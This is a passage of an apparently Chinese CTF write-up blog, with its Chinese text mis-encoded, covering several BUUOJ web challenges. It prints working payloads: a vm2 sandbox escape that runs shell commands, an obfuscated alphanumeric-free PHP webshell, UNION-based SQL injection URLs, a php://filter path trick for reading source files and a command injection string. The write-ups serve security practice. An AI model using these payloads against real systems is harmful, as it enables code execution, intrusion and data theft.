</code></pre><h2 id=gxyctf2019strongestmind>[GXYCTF2019]StrongestMind</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://db8e9a28-3f4d-47dd-a825-937fb9870cd8.node5.buuoj.cn:81/index.php&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>session()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1001</span>):
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>findall(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;\d+.[+-].\d+&#39;</span>, res<span style=color:#f92672>.</span>text)
</span></span><span style=display:flex><span>    <span style=color:#75715e># æ¨¡å¼åŒ¹é…ï¼šå¸¦æœ‰åŠ å‡è¿ç®—ç¬¦çš„æ•°å­—</span>
</span></span><span style=display:flex><span>    ans <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(ans)<span style=color:#f92672>.</span>replace(<span style=color:#e6db74>&#34; &#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
</span></span><span style=display:flex><span>    res1 <span style=color:#f92672>=</span> eval(ans)
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;answer&#34;</span>: res1}
</span></span><span style=display:flex><span>    res <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>post(url, data)
</span></span><span style=display:flex><span>    time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)
</span></span><span style=display:flex><span>    print(res<span style=color:#f92672>.</span>content)
</span></span></code></pre></div><h2 id=hfctf2020justescape>[HFCTF2020]JustEscape</h2><p>çœ‹ä¸€ä¸‹<code>run.php</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>array_key_exists</span>( <span style=color:#e6db74>&#34;code&#34;</span>, $_GET ) <span style=color:#f92672>&amp;&amp;</span> $_GET[ <span style=color:#e6db74>&#39;code&#39;</span> ] <span style=color:#f92672>!=</span> <span style=color:#66d9ef>NULL</span> ) {
</span></span><span style=display:flex><span>    $code <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;code&#39;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#66d9ef>eval</span>(<span style=color:#a6e22e>code</span>);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>ç”¨è¿™æ ·çš„å‘åŒ…å¯ä»¥çœ‹åˆ°å›æ˜¾</p><pre tabindex=0><code>GET /run.php?code=1%2B1; 
X-Powered-By: Express
</code></pre><p>ç”¨çš„æ˜¯js</p><p>ç”¨<code>Error().stack</code>å›æ˜¾æ˜¯</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>Error</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>vm.js:</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>1</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>Script.runInContext</span> <span style=color:#960050;background-color:#1e0010>(vm.js:</span><span style=color:#ae81ff>131</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>20</span><span style=color:#960050;background-color:#1e0010>)</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>VM.run</span> <span style=color:#960050;background-color:#1e0010>(/app/node_modules/vm</span><span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>/lib/main.js:</span><span style=color:#ae81ff>219</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>62</span><span style=color:#960050;background-color:#1e0010>)</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>/app/server.js:</span><span style=color:#ae81ff>51</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>33</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>Layer.handle</span> [<span style=color:#960050;background-color:#1e0010>as</span> <span style=color:#960050;background-color:#1e0010>handle_request</span>] <span style=color:#960050;background-color:#1e0010>(/app/node_modules/express/lib/router/layer.js:</span><span style=color:#ae81ff>95</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>5</span><span style=color:#960050;background-color:#1e0010>)</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>next</span> <span style=color:#960050;background-color:#1e0010>(/app/node_modules/express/lib/router/route.js:</span><span style=color:#ae81ff>137</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span><span style=color:#960050;background-color:#1e0010>)</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>Route.dispatch</span> <span style=color:#960050;background-color:#1e0010>(/app/node_modules/express/lib/router/route.js:</span><span style=color:#ae81ff>112</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>3</span><span style=color:#960050;background-color:#1e0010>)</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>Layer.handle</span> [<span style=color:#960050;background-color:#1e0010>as</span> <span style=color:#960050;background-color:#1e0010>handle_request</span>] <span style=color:#960050;background-color:#1e0010>(/app/node_modules/express/lib/router/layer.js:</span><span style=color:#ae81ff>95</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>5</span><span style=color:#960050;background-color:#1e0010>)</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>/app/node_modules/express/lib/router/index.js:</span><span style=color:#ae81ff>281</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>22</span> <span style=color:#960050;background-color:#1e0010>at</span> <span style=color:#960050;background-color:#1e0010>Function.process_params</span> <span style=color:#960050;background-color:#1e0010>(/app/node_modules/express/lib/router/index.js:</span><span style=color:#ae81ff>335</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span><span style=color:#960050;background-color:#1e0010>)</span>
</span></span></code></pre></div><p>ä¸åœ¨ <code>vm2</code> æ²™ç®±ä¸­æ‰§è¡Œçš„ä»£ç æœ‰å…³</p><p><a href=https://github.com/patriksimek/vm2/issues/225>Breakout in v3.8.3 Â· Issue #225 Â· patriksimek/vm2</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#e6db74>&#34;use strict&#34;</span><span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>const</span> {<span style=color:#960050;background-color:#1e0010>VM</span>} <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>require(&#39;vm</span><span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>&#39;);</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>const</span> <span style=color:#960050;background-color:#1e0010>untrusted</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>&#39;(&#39;</span> <span style=color:#960050;background-color:#1e0010>+</span> <span style=color:#960050;background-color:#1e0010>function()</span>{
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>TypeError.prototype.get_process</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>f=&gt;f.constructor(</span><span style=color:#f92672>&#34;return process&#34;</span><span style=color:#960050;background-color:#1e0010>)();</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>try</span>{
</span></span><span style=display:flex><span>		<span style=color:#960050;background-color:#1e0010>Object.preventExtensions(Buffer.from(</span><span style=color:#f92672>&#34;&#34;</span><span style=color:#960050;background-color:#1e0010>)).a</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span>	}<span style=color:#960050;background-color:#1e0010>catch(e)</span>{
</span></span><span style=display:flex><span>		<span style=color:#960050;background-color:#1e0010>return</span> <span style=color:#960050;background-color:#1e0010>e.get_process(()=&gt;{</span>}<span style=color:#960050;background-color:#1e0010>).mainModule.require(</span><span style=color:#e6db74>&#34;child_process&#34;</span><span style=color:#960050;background-color:#1e0010>).execSync(</span><span style=color:#e6db74>&#34;whoami&#34;</span><span style=color:#960050;background-color:#1e0010>).toString();</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>}+&#39;)()&#39;;</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>try</span>{
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>console.log(new</span> <span style=color:#960050;background-color:#1e0010>VM().run(untrusted));</span>
</span></span><span style=display:flex><span>}<span style=color:#960050;background-color:#1e0010>catch(x)</span>{
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>console.log(x);</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>(function()</span>{
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>TypeError.prototype.get_process</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>f=&gt;f.constructor(</span><span style=color:#f92672>&#34;return process&#34;</span><span style=color:#960050;background-color:#1e0010>)();</span>
</span></span><span style=display:flex><span>	<span style=color:#960050;background-color:#1e0010>try</span>{
</span></span><span style=display:flex><span>		<span style=color:#960050;background-color:#1e0010>Object.preventExtensions(Buffer.from(</span><span style=color:#f92672>&#34;&#34;</span><span style=color:#960050;background-color:#1e0010>)).a</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>;</span>
</span></span><span style=display:flex><span>	}<span style=color:#960050;background-color:#1e0010>catch(e)</span>{
</span></span><span style=display:flex><span>		<span style=color:#960050;background-color:#1e0010>return</span> <span style=color:#960050;background-color:#1e0010>e.get_process(()=&gt;{</span>}<span style=color:#960050;background-color:#1e0010>).mainModule.require(</span><span style=color:#e6db74>&#34;child_process&#34;</span><span style=color:#960050;background-color:#1e0010>).execSync(</span><span style=color:#e6db74>&#34;whoami&#34;</span><span style=color:#960050;background-color:#1e0010>).toString();</span>
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>})()</span>
</span></span></code></pre></div><pre tabindex=0><code>jsçš„è¿™ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå¤§è‡´æ˜¯`${`x`}y`è¿™ä¸ªå½¢å¼ï¼Œä¼šå¾—åˆ°å†…å®¹ä¸ºxyçš„å­—ç¬¦ä¸²ï¼Œè€Œå•ç‹¬ä½¿ç”¨`${x}`åˆ™æ˜¯å°†xä½œä¸ºä¸€ä¸ªå˜é‡å¼•å…¥
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>(function</span> <span style=color:#960050;background-color:#1e0010>()</span>{
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>TypeError[`${`${`prototyp`</span>}<span style=color:#960050;background-color:#1e0010>e`}`]</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`get_pro`</span>}<span style=color:#960050;background-color:#1e0010>cess`}`</span>] <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>f=&gt;f</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`constructo`</span>}<span style=color:#960050;background-color:#1e0010>r`}`</span>]<span style=color:#960050;background-color:#1e0010>(`$</span>{<span style=color:#960050;background-color:#1e0010>`${`return</span> <span style=color:#960050;background-color:#1e0010>proc`</span>}<span style=color:#960050;background-color:#1e0010>ess`}`)();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>try</span>{
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>Object.preventExtensions(Buffer.from(``)).a</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>1;</span>
</span></span><span style=display:flex><span>    }<span style=color:#960050;background-color:#1e0010>catch(e)</span>{
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>return</span> <span style=color:#960050;background-color:#1e0010>e[`${`${`get_pro`</span>}<span style=color:#960050;background-color:#1e0010>cess`}`](()=&gt;</span>{}<span style=color:#960050;background-color:#1e0010>).mainModule</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`requir`</span>}<span style=color:#960050;background-color:#1e0010>e`}`</span>]<span style=color:#960050;background-color:#1e0010>(`$</span>{<span style=color:#960050;background-color:#1e0010>`${`child_proces`</span>}<span style=color:#960050;background-color:#1e0010>s`}`)</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`exe`</span>}<span style=color:#960050;background-color:#1e0010>cSync`}`</span>]<span style=color:#960050;background-color:#1e0010>(`ls</span> <span style=color:#960050;background-color:#1e0010>/`).toString();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>})()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>(function</span> <span style=color:#960050;background-color:#1e0010>()</span>{
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>TypeError[`${`${`prototyp`</span>}<span style=color:#960050;background-color:#1e0010>e`}`]</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`get_pro`</span>}<span style=color:#960050;background-color:#1e0010>cess`}`</span>] <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>f=&gt;f</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`constructo`</span>}<span style=color:#960050;background-color:#1e0010>r`}`</span>]<span style=color:#960050;background-color:#1e0010>(`$</span>{<span style=color:#960050;background-color:#1e0010>`${`return</span> <span style=color:#960050;background-color:#1e0010>proc`</span>}<span style=color:#960050;background-color:#1e0010>ess`}`)();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>try</span>{
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>Object.preventExtensions(Buffer.from(``)).a</span> <span style=color:#960050;background-color:#1e0010>=</span> <span style=color:#960050;background-color:#1e0010>1;</span>
</span></span><span style=display:flex><span>    }<span style=color:#960050;background-color:#1e0010>catch(e)</span>{
</span></span><span style=display:flex><span>        <span style=color:#960050;background-color:#1e0010>return</span> <span style=color:#960050;background-color:#1e0010>e[`${`${`get_pro`</span>}<span style=color:#960050;background-color:#1e0010>cess`}`](()=&gt;</span>{}<span style=color:#960050;background-color:#1e0010>).mainModule</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`requir`</span>}<span style=color:#960050;background-color:#1e0010>e`}`</span>]<span style=color:#960050;background-color:#1e0010>(`$</span>{<span style=color:#960050;background-color:#1e0010>`${`child_proces`</span>}<span style=color:#960050;background-color:#1e0010>s`}`)</span>[<span style=color:#960050;background-color:#1e0010>`$</span>{<span style=color:#960050;background-color:#1e0010>`${`exe`</span>}<span style=color:#960050;background-color:#1e0010>cSync`}`</span>]<span style=color:#960050;background-color:#1e0010>(`cat</span> <span style=color:#960050;background-color:#1e0010>/flag`).toString();</span>
</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>})()</span>
</span></span></code></pre></div><h2 id=suctf-2018getshell>[SUCTF 2018]GetShell</h2><p>çœ‹æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://e43b88f4-622c-40e8-819a-a197bf504fb7.node5.buuoj.cn:81/index.php?act<span style=color:#f92672>=</span>upload
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($contents<span style=color:#f92672>=</span><span style=color:#a6e22e>file_get_contents</span>($_FILES[<span style=color:#e6db74>&#34;file&#34;</span>][<span style=color:#e6db74>&#34;tmp_name&#34;</span>])){
</span></span><span style=display:flex><span>    $data<span style=color:#f92672>=</span><span style=color:#a6e22e>substr</span>($contents,<span style=color:#ae81ff>5</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span> ($black_char <span style=color:#66d9ef>as</span> $b) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>stripos</span>($data, $b) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;illegal char&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }     
</span></span><span style=display:flex><span>} 
</span></span></code></pre></div><p><a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell | ç¦»åˆ«æ­Œ</a></p><p>æµ‹è¿‡ä¹‹åæ˜¯æ— å­—æ¯æ•°å­—ç»•è¿‡</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=</span>[];
</span></span><span style=display:flex><span>$__<span style=color:#f92672>=</span>($_<span style=color:#f92672>==</span>$_);
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>ç°</span>);
</span></span><span style=display:flex><span>$___<span style=color:#f92672>=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>åŒ—</span>);
</span></span><span style=display:flex><span>$___<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>åŒ—</span>);
</span></span><span style=display:flex><span>$___<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>çš„</span>);
</span></span><span style=display:flex><span>$___<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>å—</span>);
</span></span><span style=display:flex><span>$___<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>æ‹©</span>);
</span></span><span style=display:flex><span>$___<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$____<span style=color:#f92672>=~</span>(<span style=color:#f92672>~</span>(<span style=color:#a6e22e>_</span>));
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>è¯´</span>);
</span></span><span style=display:flex><span>$____<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>å°</span>);
</span></span><span style=display:flex><span>$____<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>ç¬”</span>);
</span></span><span style=display:flex><span>$____<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=~</span>(<span style=color:#a6e22e>ç«™</span>);
</span></span><span style=display:flex><span>$____<span style=color:#f92672>.=</span>$_[$__];
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=</span>$$____;
</span></span><span style=display:flex><span>$___($_[<span style=color:#a6e22e>_</span>]);
</span></span></code></pre></div><p>flagåœ¨envé‡Œ</p><h2 id=wmctf2020make-php-great-again>[WMCTF2020]Make PHP Great Again</h2><p><a href=https://www.anquanke.com/post/id/213235>phpæºç åˆ†æ require_once ç»•è¿‡ä¸èƒ½é‡å¤åŒ…å«æ–‡ä»¶çš„é™åˆ¶-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>?file<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
</span></span></code></pre></div><h2 id=b01lers2020life-on-mars>[b01lers2020]Life on Mars</h2><p>å…ˆæŠ“åŒ…çœ‹çœ‹ï¼Œæœ‰sqlæ³¨å…¥</p><pre tabindex=0><code>http://243413ae-f16e-4452-86a4-3e732d592467.node5.buuoj.cn:81/query?search=utopia_basin union select version(),database()
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://243413ae-f16e-4452-86a4-3e732d592467.node5.buuoj.cn:81/query?search<span style=color:#f92672>=</span>utopia_basin union <span style=color:#66d9ef>select</span> 1,group_concat<span style=color:#f92672>(</span>table_name<span style=color:#f92672>)</span> from information_schema.tables where table_schema<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;aliens&#39;</span>
</span></span></code></pre></div><p>æ²¡æµ‹å‡ºä¸œè¥¿</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://243413ae-f16e-4452-86a4-3e732d592467.node5.buuoj.cn:81/query?search<span style=color:#f92672>=</span>amazonis_planitia union <span style=color:#66d9ef>select</span> 1,group_concat<span style=color:#f92672>(</span>schema_name<span style=color:#f92672>)</span> from information_schema.schemata;
</span></span></code></pre></div><pre tabindex=0><code>http://243413ae-f16e-4452-86a4-3e732d592467.node5.buuoj.cn:81/query?search=amazonis_planitia union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#34;alien_code&#34;;
</code></pre><pre tabindex=0><code>http://243413ae-f16e-4452-86a4-3e732d592467.node5.buuoj.cn:81/query?search=amazonis_planitia union select 1,group_concat(column_name) from information_schema.columns where table_name=&#34;code&#34;;
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://243413ae-f16e-4452-86a4-3e732d592467.node5.buuoj.cn:81/query?search<span style=color:#f92672>=</span>amazonis_planitia union  <span style=color:#66d9ef>select</span> 1,group_concat<span style=color:#f92672>(</span>code<span style=color:#f92672>)</span> from alien_code.code;
</span></span></code></pre></div><h2 id=easybypass>EasyBypass</h2><pre tabindex=0><code>&#34;;sort+/fla?;&#34;&amp;comm2=1
</code></pre><h2 id=æå®¢å¤§æŒ‘æˆ˜-2020roamphp1-welcome>[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#39;REQUEST_METHOD&#39;</span>] <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;POST&#39;</span>) {
</span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;HTTP/1.1 405 Method Not Allowed&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>exit</span>();
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;roam1&#39;</span>]) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;roam2&#39;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> ($_POST[<span style=color:#e6db74>&#39;roam1&#39;</span>] <span style=color:#f92672>!==</span> $_POST[<span style=color:#e6db74>&#39;roam2&#39;</span>] <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>sha1</span>($_POST[<span style=color:#e6db74>&#39;roam1&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#a6e22e>sha1</span>($_POST[<span style=color:#e6db74>&#39;roam2&#39;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>phpinfo</span>();  <span style=color:#75715e>// collect information from phpinfo!
</span></span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>postå‘åŒ…</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /index.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 1d24031b-6933-42db-9060-cb4cc0393ede.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/avif,image/webp,image/apng,*/*;q<span style=color:#f92672>=</span>0.8,application/signed-exchange;v<span style=color:#f92672>=</span>b3;q<span style=color:#f92672>=</span>0.7
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
